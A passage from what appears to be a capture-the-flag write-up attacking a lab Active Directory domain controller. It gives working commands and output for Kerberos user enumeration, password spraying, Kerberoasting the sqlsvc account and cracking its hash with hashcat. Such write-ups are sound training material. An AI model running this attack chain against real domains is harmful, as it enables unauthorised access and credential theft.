<span class="p">|</span><span class="w"> </span>Issuer:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>scrm-DC1-CA/domainComponent<span class="o">=</span>scrm
<span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>syn-ack<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>scrm.local0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>DC1.scrm.local
<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>othername:&lt;unsupported&gt;,<span class="w"> </span>DNS:DC1.scrm.local
<span class="p">|</span><span class="w"> </span>Issuer:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>scrm-DC1-CA/domainComponent<span class="o">=</span>scrm
Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC1<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows

Host<span class="w"> </span>script<span class="w"> </span>results:
<span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>0s,<span class="w"> </span>deviation:<span class="w"> </span>0s,<span class="w"> </span>median:<span class="w"> </span>0s
<span class="p">|</span><span class="w"> </span>ms-sql-info:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">10</span>.10.11.168:1433:<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>Version:<span class="w"> </span>
<span class="p">|</span><span class="w">       </span>name:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>RTM
<span class="p">|</span><span class="w">       </span>number:<span class="w"> </span><span class="m">15</span>.00.2000.00
<span class="p">|</span><span class="w">       </span>Product:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span>
<span class="p">|</span><span class="w">       </span>Service<span class="w"> </span>pack<span class="w"> </span>level:<span class="w"> </span>RTM
<span class="p">|</span><span class="w">       </span>Post-SP<span class="w"> </span>patches<span class="w"> </span>applied:<span class="w"> </span><span class="nb">false</span>
<span class="p">|</span>_<span class="w">    </span>TCP<span class="w"> </span>port:<span class="w"> </span><span class="m">1433</span>
<span class="p">|</span><span class="w"> </span>p2p-conficker:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>Checking<span class="w"> </span><span class="k">for</span><span class="w"> </span>Conficker.C<span class="w"> </span>or<span class="w"> </span>higher...
<span class="p">|</span><span class="w">   </span>Check<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>port<span class="w"> </span><span class="m">42300</span>/tcp<span class="o">)</span>:<span class="w"> </span>CLEAN<span class="w"> </span><span class="o">(</span>Timeout<span class="o">)</span>
<span class="p">|</span><span class="w">   </span>Check<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">(</span>port<span class="w"> </span><span class="m">40536</span>/tcp<span class="o">)</span>:<span class="w"> </span>CLEAN<span class="w"> </span><span class="o">(</span>Timeout<span class="o">)</span>
<span class="p">|</span><span class="w">   </span>Check<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">(</span>port<span class="w"> </span><span class="m">9648</span>/udp<span class="o">)</span>:<span class="w"> </span>CLEAN<span class="w"> </span><span class="o">(</span>Timeout<span class="o">)</span>
<span class="p">|</span><span class="w">   </span>Check<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="o">(</span>port<span class="w"> </span><span class="m">31813</span>/udp<span class="o">)</span>:<span class="w"> </span>CLEAN<span class="w"> </span><span class="o">(</span>Timeout<span class="o">)</span>
<span class="p">|</span>_<span class="w">  </span><span class="m">0</span>/4<span class="w"> </span>checks<span class="w"> </span>are<span class="w"> </span>positive:<span class="w"> </span>Host<span class="w"> </span>is<span class="w"> </span>CLEAN<span class="w"> </span>or<span class="w"> </span>ports<span class="w"> </span>are<span class="w"> </span>blocked
<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">2</span>.02:<span class="w"> </span>
<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2022</span>-07-15T08:41:43
<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
</code></pre></div>
<p>By looking into <code>nmap</code> scan results, the ports 53, 389 and 636 are opened this indicates that the host is Domain Controller. Furthermore, the Domain Name is <code>scrm.local</code> and the hostname is <code>DC1.scrm.local</code> we have to add it to our hosts file. Another useful information from <code>nmap</code> results we identified that the port 1433 is open which represent <code>MSSQL</code> service. </p>
<h2 id="web-enumeration">Web Enumeration<a class="headerlink" href="#web-enumeration" title="Permanent link">&para;</a></h2>
<p>Going through the web page <code>/support.html</code> we will notice an alert which stats the following message:</p>
<p><img alt="" src="../writeup.assets/image-20220715045121791.png" /></p>
<p>Below the alert message, there is several web pages we can look into. By navigating into <code>/salesorders.html</code> web page, we will notice a guidance of using <strong>Sales Orders App</strong>. From the guidance we can see a new port which is 4411. </p>
<p><img alt="" src="../writeup.assets/image-20220715045354754.png" /></p>
<p>Running <code>nmap</code> will give us the following results. Nothing interesting beside that the port is open. </p>
<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span><span class="m">10</span>.10.11.168<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-vv<span class="w"> </span>-p<span class="w"> </span><span class="m">4411</span>
PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>REASON<span class="w">  </span>VERSION
<span class="m">4411</span>/tcp<span class="w"> </span>open<span class="w">  </span>found?<span class="w">  </span>syn-ack
<span class="p">|</span><span class="w"> </span>fingerprint-strings:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>DNSStatusRequestTCP,<span class="w"> </span>DNSVersionBindReqTCP,<span class="w"> </span>GenericLines,<span class="w"> </span>JavaRMI,<span class="w"> </span>Kerberos,<span class="w"> </span>LANDesk-RC,<span class="w"> </span>LDAPBindReq,<span class="w"> </span>LDAPSearchReq,<span class="w"> </span>NCP,<span class="w"> </span>NULL,<span class="w"> </span>NotesRPC,<span class="w"> </span>RPCCheck,<span class="w"> </span>SMBProgNeg,<span class="w"> </span>SSLSessionReq,<span class="w"> </span>TLSSessionReq,<span class="w"> </span>TerminalServer,<span class="w"> </span>TerminalServerCookie,<span class="w"> </span>WMSRequest,<span class="w"> </span>X11Probe,<span class="w"> </span>afp,<span class="w"> </span>giop,<span class="w"> </span>ms-sql-s,<span class="w"> </span>oracle-tns:<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
<span class="p">|</span><span class="w">   </span>FourOhFourRequest,<span class="w"> </span>GetRequest,<span class="w"> </span>HTTPOptions,<span class="w"> </span>Help,<span class="w"> </span>LPDString,<span class="w"> </span>RTSPRequest,<span class="w"> </span>SIPOptions:<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
<span class="p">|</span>_<span class="w">    </span>ERROR_UNKNOWN_COMMAND<span class="p">;</span>
<span class="m">1</span><span class="w"> </span>service<span class="w"> </span>unrecognized<span class="w"> </span>despite<span class="w"> </span>returning<span class="w"> </span>data.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>know<span class="w"> </span>the<span class="w"> </span>service/version,<span class="w"> </span>please<span class="w"> </span>submit<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>fingerprint<span class="w"> </span>at<span class="w"> </span>https://nmap.org/cgi-bin/submit.cgi?new-service<span class="w"> </span>:
SF-Port4411-TCP:V<span class="o">=</span><span class="m">7</span>.91%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">7</span>/15%Time<span class="o">=</span>62D1288A%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NU
SF:LL,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,1D,<span class="s2">&quot;SCRAMBLEC</span>
<span class="s2">SF:ORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,35,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.</span>
<span class="s2">SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,35,<span class="s2">&quot;SCRAMBLECORP_ORDER</span>
<span class="s2">SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,35,<span class="s2">&quot;SCRAMBLEC</span>
<span class="s2">SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,1D,<span class="s2">&quot;SCR</span>
<span class="s2">SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,1D,<span class="s2">&quot;SCRAMBLECOR</span>
<span class="s2">SF:P_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_</span>
<span class="s2">SF:V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Help,35,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO</span>
<span class="s2">SF:WN_COMMAND;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n</span>
<span class="s2">SF:&quot;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>TLS
SF:SessionReq,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,1D,<span class="s2">&quot;SCRAM</span>
<span class="s2">SF:BLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\</span>
<span class="s2">SF:.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourO
SF:hFourRequest,35,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND</span>
<span class="s2">SF:;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LPDString,35,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_</span>
<span class="s2">SF:COMMAND;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LDAPSearchReq,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%
SF:r<span class="o">(</span>LDAPBindReq,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,35,<span class="s2">&quot;</span>
<span class="s2">SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LANDesk
SF:-RC,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,1D,<span class="s2">&quot;SCRAMB</span>
<span class="s2">SF:LECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NCP,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r</span>
<span class="s2">SF:\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>JavaRMI,1D,<span class="s2">&quot;S</span>
<span class="s2">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>WMSRequest,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS</span>
<span class="s2">SF:_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r
SF:<span class="o">(</span>ms-sql-s,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>afp,1D,<span class="s2">&quot;SCRAMBLECOR</span>
<span class="s2">SF:P_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>giop,1D,<span class="s2">&quot;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&quot;</span><span class="o">)</span><span class="p">;</span>
</code></pre></div>
<p>Also, we can run <code>nc</code>. </p>
<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="m">10</span>.10.11.168<span class="w"> </span><span class="m">4411</span><span class="w"> </span>
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
<span class="nb">test</span>
ERROR_UNKNOWN_COMMAND<span class="p">;</span>
</code></pre></div>
<p>Going back to web pages, the web page <code>/passwords.html</code> disclose useful information. Which is: <code>we will reset your password to be the same as the username.</code> </p>
<p><img alt="" src="../writeup.assets/image-20220715045702189.png" /></p>
<p>So now we know that if we attempt to reset a user password, the new password will be same as the username. From this information, let's try to hunt for users. </p>
<h2 id="user-enumeration">User Enumeration<a class="headerlink" href="#user-enumeration" title="Permanent link">&para;</a></h2>
<p>Because it is Domain Controller we can enumerate valid Domain Users using <strong>Pre-Authentication</strong>. </p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast. For further reading refer to this <a href="https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce">resource</a>.</p>
</div>
<p>To enumerate the valid Domain Users I'll use Impacket's <code>GetNPUsers</code> and shorter wordlist that can be found <a href="https://raw.githubusercontent.com/attackdebris/kerberos_enum_userlists/master/A-ZSurnames.txt">here</a>. We can also use the wordlist <code>/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt</code> but will take too much of time. To enumerate the valid Domain Users run the following command: </p>
<div class="highlight"><pre><span></span><code>GetNPUsers.py<span class="w"> </span>scrm.local/<span class="w"> </span>-no-pass<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.168<span class="w"> </span>-usersfile<span class="w"> </span>A-ZSurnames.txt
</code></pre></div>
<p><img alt="" src="../writeup.assets/image-20220715051913526.png" /></p>
<p>Alternatively, we can use <code>Kerbrute</code> which is faster because it is based in Golang. <code>Kerbrute</code> can be downloaded from <a href="https://github.com/ropnop/kerbrute">here</a></p>
<div class="highlight"><pre><span></span><code>./kerbrute<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span>scrm.local<span class="w"> </span>A-ZSurnames.txt<span class="w"> </span>--dc<span class="w"> </span>dc1.scrm.local

<span class="w">    </span>__<span class="w">             </span>__<span class="w">               </span>__<span class="w">     </span>
<span class="w">   </span>/<span class="w"> </span>/_____<span class="w">  </span>_____/<span class="w"> </span>/_<span class="w">  </span>_______<span class="w">  </span>__/<span class="w"> </span>/____<span class="w"> </span>
<span class="w">  </span>/<span class="w"> </span>//_/<span class="w"> </span>_<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>__<span class="w"> </span><span class="se">\/</span><span class="w"> </span>___/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>/<span class="w"> </span>__/<span class="w"> </span>_<span class="w"> </span><span class="se">\</span>
<span class="w"> </span>/<span class="w"> </span>,&lt;<span class="w"> </span>/<span class="w">  </span>__/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/<span class="w">  </span>/<span class="w"> </span>/_/<span class="w"> </span>/<span class="w"> </span>/_/<span class="w">  </span>__/
/_/<span class="p">|</span>_<span class="p">|</span><span class="se">\_</span>__/_/<span class="w">  </span>/_.___/_/<span class="w">   </span><span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/<span class="w">                                        </span>

Version:<span class="w"> </span>v1.0.3<span class="w"> </span><span class="o">(</span>9dad6e1<span class="o">)</span><span class="w"> </span>-<span class="w"> </span><span class="m">07</span>/15/22<span class="w"> </span>-<span class="w"> </span>Ronnie<span class="w"> </span>Flathers<span class="w"> </span>@ropnop

<span class="m">2022</span>/07/15<span class="w"> </span><span class="m">05</span>:36:26<span class="w"> </span>&gt;<span class="w">  </span>Using<span class="w"> </span>KDC<span class="o">(</span>s<span class="o">)</span>:
<span class="m">2022</span>/07/15<span class="w"> </span><span class="m">05</span>:36:26<span class="w"> </span>&gt;<span class="w">   </span>dc1.scrm.local:88

<span class="m">2022</span>/07/15<span class="w"> </span><span class="m">05</span>:36:27<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">   </span>ASMITH@scrm.local
<span class="m">2022</span>/07/15<span class="w"> </span><span class="m">05</span>:38:25<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">   </span>JHALL@scrm.local
<span class="m">2022</span>/07/15<span class="w"> </span><span class="m">05</span>:38:39<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">   </span>KSIMPSON@scrm.local
<span class="m">2022</span>/07/15<span class="w"> </span><span class="m">05</span>:38:47<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">   </span>KHICKS@scrm.local
<span class="m">2022</span>/07/15<span class="w"> </span><span class="m">05</span>:40:25<span class="w"> </span>&gt;<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w">   </span>SJENKINS@scrm.local
</code></pre></div>
<h2 id="password-spray">Password Spray<a class="headerlink" href="#password-spray" title="Permanent link">&para;</a></h2>
<p>After finding valid Domain Users, let's conduct password spray attacks using the username as password for each user. Here we can use smartbrute tool. </p>
<p><img alt="" src="../writeup.assets/image-20220715060125955.png" /></p>
<div class="admonition bug">
<p class="admonition-title">Bug</p>
<p>I had an issue during while solving the machine. NTLM authentication is disabled we can use kerberos authentication instead. The issue is when using tools such as <code>crackmapexec</code>  or <code>impacket</code> sometime it will fail and does not give us any information. 
To solve this issue use <code>-k</code> flag to make use of kerberos authentication.</p>
</div>
<h2 id="enumerate-spns">Enumerate SPNs<a class="headerlink" href="#enumerate-spns" title="Permanent link">&para;</a></h2>
<p>After obtaining valid creds, we might be able to enumerate SPNs account using Impacket's <code>GetUserSPNs</code>. As I said before the NTLM authentication will not work we should use the flag <code>-k</code>. Hence, I found an issue in <code>GetUserSPNs</code> to solve this issue refer to this <a href="https://github.com/SecureAuthCorp/impacket/issues/1206#issuecomment-961395218">link</a>. </p>
<div class="highlight"><pre><span></span><code>GetUserSPNs.py<span class="w"> </span>scrm.local/ksimpson:<span class="s1">&#39;ksimpson&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span>dc1.scrm.local<span class="w"> </span>-request<span class="w"> </span>-k
Impacket<span class="w"> </span>v0.10.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation

<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>CCache<span class="w"> </span>file<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>found.<span class="w"> </span>Skipping...
<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>CCache<span class="w"> </span>file<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>found.<span class="w"> </span>Skipping...
ServicePrincipalName<span class="w">          </span>Name<span class="w">    </span>MemberOf<span class="w">  </span>PasswordLastSet<span class="w">             </span>LastLogon<span class="w">                   </span>Delegation<span class="w"> </span>
----------------------------<span class="w">  </span>------<span class="w">  </span>--------<span class="w">  </span>--------------------------<span class="w">  </span>--------------------------<span class="w">  </span>----------
MSSQLSvc/dc1.scrm.local:1433<span class="w">  </span>sqlsvc<span class="w">            </span><span class="m">2021</span>-11-03<span class="w"> </span><span class="m">12</span>:32:02.351452<span class="w">  </span><span class="m">2022</span>-07-15<span class="w"> </span><span class="m">04</span>:08:04.045229<span class="w">             </span>
MSSQLSvc/dc1.scrm.local<span class="w">       </span>sqlsvc<span class="w">            </span><span class="m">2021</span>-11-03<span class="w"> </span><span class="m">12</span>:32:02.351452<span class="w">  </span><span class="m">2022</span>-07-15<span class="w"> </span><span class="m">04</span>:08:04.045229<span class="w">             </span>



<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>CCache<span class="w"> </span>file<span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>found.<span class="w"> </span>Skipping...
<span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc*<span class="nv">$031</span>a9fba52ac8c46413a559f05f2fe1f<span class="nv">$befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f</span>
</code></pre></div>
<p>Now we retrieve the TGS of the SPN account <code>sqlsvc</code>, we can use <code>hashcat</code> to crack the TGS ticket. </p>
<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>sqlsvc-spn<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force

<span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc*<span class="nv">$031</span>a9fba52ac8c46413a559f05f2fe1f<span class="nv">$befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f</span>:Pegasus60
</code></pre></div>
<p>We cracked <code>sqlsvc</code>'s password which is: <code>Pegasus60</code>. As seen previously the service account <code>sqlsvc</code> is allowed to access <code>MSSQL</code> service.</p>
<h2 id="enumerate-shares">Enumerate Shares<a class="headerlink" href="#enumerate-shares" title="Permanent link">&para;</a></h2>
<p>Because of NTLM authentication is disabled we will use kerberos as authetication protocol. To do this, we can export user's ticket using Impacket's <code>GetTGT</code>: </p>
<div class="highlight"><pre><span></span><code>getTGT.py<span class="w"> </span>scrm.local/ksimpson:<span class="s1">&#39;ksimpson&#39;</span><span class="w">       </span>
Impacket<span class="w"> </span>v0.10.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2022</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>ksimpson.ccache
</code></pre></div>
